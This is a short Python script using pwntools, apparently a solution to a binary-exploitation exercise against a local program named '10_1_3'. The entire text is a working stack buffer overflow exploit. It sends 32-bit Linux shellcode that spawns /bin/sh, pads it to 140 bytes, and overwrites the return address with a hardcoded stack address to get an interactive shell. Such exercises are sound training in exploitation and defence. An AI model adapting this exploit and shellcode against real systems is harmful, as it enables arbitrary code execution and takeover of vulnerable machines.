from pwn import *

io = process('./10_1_3')

ret = 0xbfd98fd0
shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload  = shellcode
payload += b'A' * (140 - len(shellcode))
payload += p32(ret)

io.send(payload)
io.interactive()
